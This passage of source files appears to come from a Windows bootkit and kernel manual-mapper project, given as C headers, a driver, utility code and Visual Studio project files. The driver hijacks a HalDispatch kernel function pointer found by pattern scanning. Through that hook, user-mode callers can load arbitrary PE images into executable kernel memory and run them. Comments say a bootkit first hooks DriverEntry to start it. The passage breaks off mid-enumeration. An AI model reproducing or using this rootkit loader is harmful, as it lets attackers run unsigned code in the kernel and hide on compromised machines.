    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_FILE_HEADER {
    UINT16  Machine;
    UINT16  NumberOfSections;
    UINT32  TimeDateStamp;
    UINT32  PointerToSymbolTable;
    UINT32  NumberOfSymbols;
    UINT16  SizeOfOptionalHeader;
    UINT16  Characteristics;
} IMAGE_FILE_HEADER;

typedef struct _IMAGE_NT_HEADERS64 {
    UINT32 Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64;

typedef struct _IMAGE_SECTION_HEADER {
    UINT8    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        UINT32   PhysicalAddress;
        UINT32   VirtualSize;
    } Misc;
    UINT32   VirtualAddress;
    UINT32   SizeOfRawData;
    UINT32   PointerToRawData;
    UINT32   PointerToRelocations;
    UINT32   PointerToLinenumbers;
    UINT16   NumberOfRelocations;
    UINT16   NumberOfLinenumbers;
    UINT32   Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#pragma warning(push)
#pragma warning(disable: 4201)
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        UINT32   Characteristics;
        UINT32   OriginalFirstThunk;
    };

    UINT32   TimeDateStamp;
    UINT32   ForwarderChain;
    UINT32   Name;
    UINT32   FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR;
#pragma warning(pop)

typedef struct _IMAGE_THUNK_DATA64 {
    union {
        UINT64 ForwarderString;
        UINT64 Function;
        UINT64 Ordinal;
        UINT64 AddressOfData;
    } u1;
} IMAGE_THUNK_DATA64;

typedef struct _IMAGE_IMPORT_BY_NAME {
    UINT16 Hint;
    CHAR8  Name[1];
} IMAGE_IMPORT_BY_NAME;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    UINT32 Characteristics;
    UINT32 TimeDateStamp;
    UINT16 MajorVersion;
    UINT16 MinorVersion;
    UINT32 Name;
    UINT32 Base;
    UINT32 NumberOfFunctions;
    UINT32 NumberOfNames;
    UINT32 AddressOfFunctions;
    UINT32 AddressOfNames;
    UINT32 AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;

typedef struct _IMAGE_BASE_RELOCATION {
    UINT32 VirtualAddress;
    UINT32 SizeOfBlock;
} IMAGE_BASE_RELOCATION;

VOID MemCopy(VOID *dest, VOID *src, UINTN size);
VOID *FindPattern(CHAR8 *base, UINTN size, CHAR8 *pattern, CHAR8 *mask);
VOID *TrampolineHook(VOID *dest, VOID *src, UINT8 original[JMP_SIZE]);
VOID TrampolineUnHook(VOID *src, UINT8 original[JMP_SIZE]);
KLDR_DATA_TABLE_ENTRY *GetModuleEntry(LIST_ENTRY *list, CHAR16 *name);
UINT64 GetExport(UINT8 *base, CHAR8 *export);
```

`mapper/main.c`:

```c
#include "stdafx.h"

INT64(*HalDispatchOriginal)(PVOID, PVOID);

// The bootkit mapper will fill this data
__declspec(dllexport) volatile BYTE mapperData[MAPPER_DATA_SIZE];

VOID Main(PVOID func) {
	// Undo hook by bootkit (no error checking because there's no reason it should fail
	// and if it does fail then you can't recover)
	MemCopyWP(func, (PVOID)mapperData, sizeof(mapperData));

	// Simple .data function pointer hook
	PVOID kernelBase = GetModuleBaseAddress("ntoskrnl.exe");
	if (!kernelBase) {
		printf("Failed to find kernel base\n");
		return;
	}

	PVOID addr = FindPatternImage(kernelBase, "\x48\x8B\x05\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x8B\xC8\x85\xC0\x78\x40", "xxx????x????xxxxxx");
	if (!addr) {
		printf("Failed to find the function pointer\n");
		return;
	}

	*(PVOID *)&HalDispatchOriginal = InterlockedExchangePointer(RELATIVE_ADDR(addr, 7), (PVOID)HalDispatchHook);
}

INT64 HalDispatchHook(PIMAGE_DATA imageData, PINT64 outStatus) {
	if (ExGetPreviousMode() != UserMode || !imageData) {
		return HalDispatchOriginal(imageData, outStatus);
	}

	IMAGE_DATA safeData;
	if (!SafeCopy(&safeData, imageData, sizeof(safeData)) || safeData.Magic != 0x6789) {
		return HalDispatchOriginal(imageData, outStatus);
	}

	PVOID kernelBuffer = ExAllocatePool(NonPagedPool, safeData.Length);
	if (!kernelBuffer) {
		*outStatus = STATUS_NO_MEMORY;
		return STATUS_SUCCESS;
	}

	if (!SafeCopy(kernelBuffer, &imageData->Buffer, safeData.Length)) {
		ExFreePool(kernelBuffer);
		*outStatus = STATUS_ACCESS_VIOLATION;
		return STATUS_SUCCESS;
	}

	CHAR error[0xFF] = { 0 };
	NTSTATUS status = MapImage(kernelBuffer, error);
	SafeCopy(&imageData->Buffer, error, strlen(error) + 1);
	ExFreePool(kernelBuffer);

	*outStatus = status;
	return STATUS_SUCCESS;
}

// One could easily pass a bogus PE to intentionally BSOD - CBA to make it safe
NTSTATUS MapImage(PBYTE buffer, PCHAR error) {
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)buffer;
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE) {
		sprintf(error, "Image does not have DOS signature");
		return STATUS_NOT_SUPPORTED;
	}

	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(buffer + dosHeaders->e_lfanew);

	PBYTE base = ExAllocatePool(NonPagedPoolExecute, ntHeaders->OptionalHeader.SizeOfImage);
	if (!base) {
		sprintf(error, "Failed to allocate pool of size 0x%X", ntHeaders->OptionalHeader.SizeOfImage);
		return STATUS_NO_MEMORY;
	}

	// Map headers
	memcpy(base, buffer, ntHeaders->OptionalHeader.SizeOfHeaders);

	// Map sections
	PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((PBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);
	for (USHORT i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (section->SizeOfRawData) {
			memcpy(base + section->VirtualAddress, buffer + section->PointerToRawData, section->SizeOfRawData);
		}
	}

	// Resolve imports
	ULONG importsRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (importsRva) {
		PIMAGE_IMPORT_DESCRIPTOR importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(base + importsRva);

		for (; importDescriptor->FirstThunk; ++importDescriptor) {
			PCHAR moduleName = (PCHAR)(base + importDescriptor->Name);
			PVOID module = GetModuleBaseAddress(moduleName);
			if (!module) {
				sprintf(error, "Failed to find module %s", moduleName);

				ExFreePool(base);
				return STATUS_NOT_FOUND;
			}

			PIMAGE_THUNK_DATA64 thunk = (PIMAGE_THUNK_DATA64)(base + importDescriptor->FirstThunk);
			PIMAGE_THUNK_DATA64 thunkOriginal = (PIMAGE_THUNK_DATA64)(base + importDescriptor->OriginalFirstThunk);

			for (; thunk->u1.AddressOfData; ++thunk, ++thunkOriginal) {
				PCHAR importName = ((PIMAGE_IMPORT_BY_NAME)(base + thunkOriginal->u1.AddressOfData))->Name;
				ULONG64 import = GetExport(module, importName);
				if (!import) {
					sprintf(error, "Failed to find export %s in module %s", importName, moduleName);

					ExFreePool(base);
					return STATUS_NOT_FOUND;
				}

				thunk->u1.Function = import;
			}
		}
	}

	// Resolve relocations
	PIMAGE_DATA_DIRECTORY baseRelocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if (baseRelocDir->VirtualAddress) {
		PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(base + baseRelocDir->VirtualAddress);

		for (UINT32 currentSize = 0; currentSize < baseRelocDir->Size; ) {
			ULONG relocCount = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
			PUSHORT relocData = (PUSHORT)((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
			PBYTE relocBase = base + reloc->VirtualAddress;

			for (UINT32 i = 0; i < relocCount; ++i, ++relocData) {
				USHORT data = *relocData;
				USHORT type = data >> 12;
				USHORT offset = data & 0xFFF;

				switch (type) {
					case IMAGE_REL_BASED_ABSOLUTE:
						break;
					case IMAGE_REL_BASED_DIR64: {
						PULONG64 rva = (PULONG64)(relocBase + offset);
						*rva = (ULONG64)(base + (*rva - ntHeaders->OptionalHeader.ImageBase));
						break;
					}
					default:
						sprintf(error, "Unsupported relocation type %d", type);

						ExFreePool(base);
						return STATUS_NOT_SUPPORTED;
				}
			}

			currentSize += reloc->SizeOfBlock;
			reloc = (PIMAGE_BASE_RELOCATION)relocData;
		}
	}

	return ((PDRIVER_INITIALIZE)(base + ntHeaders->OptionalHeader.AddressOfEntryPoint))((PDRIVER_OBJECT)base, NULL);
}

// The third parameter is a pointer to the original DriverEntry that we inline hooked
NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING registryPath, DRIVER_INITIALIZE func) {
	UNREFERENCED_PARAMETER(driver);
	UNREFERENCED_PARAMETER(registryPath);

	Main((PVOID)func);

	return func(driver, registryPath);
}
```

`mapper/mapper.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="mmap.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`mapper/mapper.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{2B77A5D9-C937-4F39-9F3D-2ABB3B997CF6}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>mmap</RootNamespace>
    <ProjectName>mapper</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
      <TreatWarningAsError>true</TreatWarningAsError>
    </ClCompile>
    <Link>
      <AdditionalDependencies>$(DDK_LIB_PATH)ntoskrnl.lib</AdditionalDependencies>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
      <ForceSymbolReferences>
      </ForceSymbolReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <TreatLinkerWarningAsErrors>true</TreatLinkerWarningAsErrors>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
    <ClCompile Include="util.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="util.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`mapper/mapper.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Header Files">
      <UniqueIdentifier>{0ebafc19-0482-4810-94d9-136047d0d6cf}</UniqueIdentifier>
    </Filter>
    <Filter Include="Source Files">
      <UniqueIdentifier>{02e197d6-6928-49ac-ab24-7f04042b404d}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="util.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="util.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`mapper/stdafx.h`:

```h
#pragma once

#include <ntifs.h>
#include <ntddk.h>
#include <ntimage.h>
#include <minwindef.h>
#include <ntstrsafe.h>

#include "util.h"

typedef struct _IMAGE_DATA {
	WORD Magic;
	ULONG Length;
	BYTE Buffer[1];
} IMAGE_DATA, *PIMAGE_DATA;

#define MAPPER_DATA_SIZE (JMP_SIZE + 7)

INT64 HalDispatchHook(PIMAGE_DATA imageData, PINT64 status);
NTSTATUS MapImage(PBYTE buffer, PCHAR error);
```

`mapper/util.c`:

```c
#include "stdafx.h"

BOOLEAN SafeCopy(PVOID dest, PVOID src, SIZE_T size) {
	SIZE_T returnSize = 0;
	if (NT_SUCCESS(MmCopyVirtualMemory(PsGetCurrentProcess(), src, PsGetCurrentProcess(), dest, size, KernelMode, &returnSize)) && returnSize == size) {
		return TRUE;
	}

	return FALSE;
}

BOOLEAN CheckMask(PCHAR base, PCHAR pattern, PCHAR mask) {
	for (; *mask; ++base, ++pattern, ++mask) {
		if (*mask == 'x' && *base != *pattern) {
			return FALSE;
		}
	}

	return TRUE;
}

PVOID FindPattern(PCHAR base, DWORD length, PCHAR pattern, PCHAR mask) {
	length -= (DWORD)strlen(mask);
	for (DWORD i = 0; i <= length; ++i) {
		PVOID addr = &base[i];
		if (CheckMask(addr, pattern, mask)) {
			return addr;
		}
	}

	return 0;
}

PVOID FindPatternImage(PCHAR base, PCHAR pattern, PCHAR mask) {
	PVOID match = 0;

	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(headers);
	for (DWORD i = 0; i < headers->FileHeader.NumberOfSections; ++i) {
		PIMAGE_SECTION_HEADER section = &sections[i];
		if (*(PINT)section->Name == 'EGAP' || memcmp(section->Name, ".text", 5) == 0) {
			match = FindPattern(base + section->VirtualAddress, section->Misc.VirtualSize, pattern, mask);
			if (match) {
				break;
			}
		}
	}

	return match;
}

PVOID GetModuleBaseAddress(PCHAR name) {
	PVOID addr = 0;

	ULONG size = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemModuleInformation, 0, 0, &size);
	if (STATUS_INFO_LENGTH_MISMATCH != status) {
		printf("ZwQuerySystemInformation for size failed: %x\n", status);
		return addr;
	}

	PSYSTEM_MODULE_INFORMATION modules = ExAllocatePool(NonPagedPool, size);
	if (!modules) {
		printf("Failed to allocate %d bytes for modules\n", size);
		return addr;
	}

	if (!NT_SUCCESS(status = ZwQuerySystemInformation(SystemModuleInformation, modules, size, 0))) {
		printf("ZwQuerySystemInformation failed: %x\n", status);

		ExFreePool(modules);
		return addr;
	}

	for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
		SYSTEM_MODULE m = modules->Modules[i];

		if (strstr((PCHAR)m.FullPathName, name)) {
			addr = m.ImageBase;
			break;
		}
	}

	ExFreePool(modules);
	return addr;
}

ULONG64 GetExport(PBYTE base, PCHAR export) {
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)base;
	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE) {
		return 0;
	}

	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(base + dosHeaders->e_lfanew);

	ULONG exportsRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (!exportsRva) {
		return 0;
	}

	PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + exportsRva);
	PULONG nameRva = (PULONG)(base + exports->AddressOfNames);

	for (ULONG i = 0; i < exports->NumberOfNames; ++i) {
		PCHAR func = (PCHAR)(base + nameRva[i]);
		if (strcmp(func, export) == 0) {
			PULONG funcRva = (PULONG)(base + exports->AddressOfFunctions);
			PWORD ordinalRva = (PWORD)(base + exports->AddressOfNameOrdinals);

			return (ULONG64)base + funcRva[ordinalRva[i]];
		}
	}

	return 0;
}

BOOLEAN MemCopyWP(PVOID dest, PVOID src, ULONG length) {
	PMDL mdl = IoAllocateMdl(dest, length, FALSE, FALSE, NULL);
	if (!mdl) {
		return FALSE;
	}

	MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);

	PVOID mapped = MmMapLockedPagesSpecifyCache(mdl, KernelMode, MmNonCached, NULL, 0, HighPagePriority);
	if (!mapped) {
		MmUnlockPages(mdl);
		IoFreeMdl(mdl);
		return FALSE;
	}

	memcpy(mapped, src, length);

	MmUnmapLockedPages(mapped, mdl);
	MmUnlockPages(mdl);
	IoFreeMdl(mdl);
	return TRUE;
}
```

`mapper/util.h`:

```h
#pragma once

#define JMP_SIZE (14)
#define RELATIVE_ADDR(addr, size) ((PVOID)((PBYTE)(addr) + *(PINT)((PBYTE)(addr) + ((size) - (INT)sizeof(INT))) + (size)))
#define printf(fmt, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[dbg] " fmt, ##__VA_ARGS__)

BOOLEAN SafeCopy(PVOID dest, PVOID src, SIZE_T size);
PVOID FindPatternImage(PCHAR base, PCHAR pattern, PCHAR mask);
PVOID GetModuleBaseAddress(PCHAR name);
ULONG64 GetExport(PBYTE base, PCHAR export);
BOOLEAN MemCopyWP(PVOID dest, PVOID src, ULONG length);

NTSYSCALLAPI NTSTATUS NTAPI ZwQuerySystemInformation(ULONG InfoClass, PVOID Buffer, ULONG Length, PULONG ReturnLength);
NTKERNELAPI NTSTATUS NTAPI MmCopyVirtualMemory(PEPROCESS SourceProcess, PVOID SourceAddress, PEPROCESS TargetProcess, PVOID TargetAddress, SIZE_T BufferSize, KPROCESSOR_MODE PreviousMode, PSIZE_T ReturnSize);

typedef struct _SYSTEM_MODULE {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR  FullPathName[MAXIMUM_FILENAME_LENGTH];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG NumberOfModules;
	SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0x0,
	SystemProcessorInformation = 0x1,
	SystemPerformanceInformation = 0x2,
	SystemTimeOfDayInformation = 0x3,
	SystemPathInformation = 0x4,
	SystemProcessInformation = 0x5,
	SystemCallCountInformation = 0x6,
	SystemDeviceInformation = 0x7,
	SystemProcessorPerformanceInformation = 0x8,
	SystemFlagsInformation = 0x9,
	SystemCallTimeInformation = 0xa,
	SystemModuleInformation = 0xb,
	SystemLocksInformation = 0xc,
	SystemStackTraceInformation = 0xd,
	SystemPagedPoolInformation = 0xe,
	SystemNonPagedPoolInformation = 0xf,
	SystemHandleInformation = 0x10,
	SystemObjectInformation = 0x11,
	SystemPageFileInformation = 0x12,
	SystemVdmInstemulInformation = 0x13,
	SystemVdmBopInformation = 0x14,
	SystemFileCacheInformation = 0x15,
	SystemPoolTagInformation = 0x16,
	SystemInterruptInformation = 0x17,
	SystemDpcBehaviorInformation = 0x18,
	SystemFullMemoryInformation = 0x19,
	SystemLoadGdiDriverInformation = 0x1a,
	SystemUnloadGdiDriverInformation = 0x1b,
	SystemTimeAdjustmentInformation = 0x1c,
	SystemSummaryMemoryInformation = 0x1d,
	SystemMirrorMemoryInformation = 0x1e,
	SystemPerformanceTraceInformation = 0x1f,
	SystemObsolete0 = 0x20,
	SystemExceptionInformation = 0x21,
	SystemCrashDumpStateInformation = 0x22,
	SystemKernelDebuggerInformation = 0x23,
	SystemContextSwitchInformation = 0x24,
	SystemRegistryQuotaInformation = 0x25,
	SystemExtendServiceTableInformation = 0x26,
	SystemPrioritySeperation = 0x27,
	SystemVerifierAddDriverInformation = 0x28,
	SystemVerifierRemoveDriverInformation = 0x29,
	SystemProcessorIdleInformation = 0x2a,
	SystemLegacyDriverInformation = 0x2b,
	SystemCurrentTimeZoneInformation = 0x2c,
	SystemLookasideInformation = 0x2d,
	SystemTimeSlipNotification = 0x2e,
	SystemSessionCreate = 0x2f,
	SystemSessionDetach = 0x30,
	SystemSessionInformation = 0x31,
	SystemRangeStartInformation = 0x32,
	SystemVerifierInformation = 0x33,
	SystemVerifierThunkExtend = 0x34,
	SystemSessionProcessInformation = 0x35,
	SystemLoadGdiDriverInSystemSpace = 0x36,
	SystemNumaProcessorMap = 0x37,
	SystemPrefetcherInformation = 0x38,
	SystemExtendedProcessInformation = 0x39,
	SystemRecommendedSharedDataAlignment = 0x3a,
	SystemComPlusPackage = 0x3b,
	SystemNumaAvailableMemory = 0x3c,
	SystemProcessorPowerInformation = 0x3d,
	SystemEmulationBasicInformation = 0x3e,
	SystemEmulationProcessorInformation = 0x3f,
	SystemExtendedHandleInformation = 0x40,
	SystemLostDelayedWriteInformation = 0x41,
	SystemBigPoolInformation = 0x42,
	SystemSessionPoolTagInformation = 0x43,
	SystemSessionMappedViewInformation = 0x44,
	SystemHotpatchInformation = 0x45,
	SystemObjectSecurityMode = 0x46,
	SystemWatchdogTimerHandler = 0x47,
	SystemWatchdogTimerInformation = 0x48,
	SystemLogicalProcessorInformation = 0x49,
	SystemWow64SharedInformationObsolete = 0x4a,
	SystemRegisterFirmwareTableInformationHandler = 0x4b,
	SystemFirmwareTableInformation = 0x4c,
	SystemModuleInformationEx = 0x4d,
	SystemVerifierTriageInformation = 0x4e,
	SystemSuperfetchInformation = 0x4f,
